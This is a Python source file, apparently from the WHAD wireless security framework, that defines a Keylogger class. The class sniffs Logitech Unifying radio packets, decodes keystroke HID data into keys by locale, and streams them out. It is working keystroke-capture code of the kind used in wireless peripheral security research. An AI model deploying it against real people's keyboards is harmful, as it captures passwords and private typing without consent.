from whad.unifying.connector import Sniffer
from whad.unifying.hid import LogitechUnifyingKeystrokeConverter, HIDCodeNotFound, InvalidHIDData
from whad.scapy.layers.unifying import Logitech_Unencrypted_Keystroke_Payload, Logitech_Encrypted_Keystroke_Payload

class Keylogger(Sniffer):
    """
    Logitech Unifying Keylogger interface for compatible WHAD device.
    """

    def __init__(self, device):
        super().__init__(device)
        self.__locale = "fr"
        self.key = None

    @property
    def locale(self):
        return self.__locale

    @locale.setter
    def locale(self, locale):
        self.__locale = locale

    def stream(self):
        for packet in super().sniff():
            hid_data = None
            if Logitech_Unencrypted_Keystroke_Payload in packet:
                hid_data = packet.hid_data

            if Logitech_Encrypted_Keystroke_Payload in packet:
                hid_data = packet.hid_data

            if hid_data is not None:
                if hid_data == b"\x00" * 7:
                    self.key = None
                else:
                    try:
                        key = LogitechUnifyingKeystrokeConverter.get_key_from_hid_data(hid_data, locale=self.__locale)

                        if key != self.key:
                            self.key = key
                            if len(self.key) > 1:
                                self.key = " [{}] ".format(self.key)
                            yield self.key
                    except (HIDCodeNotFound, InvalidHIDData):
                        pass
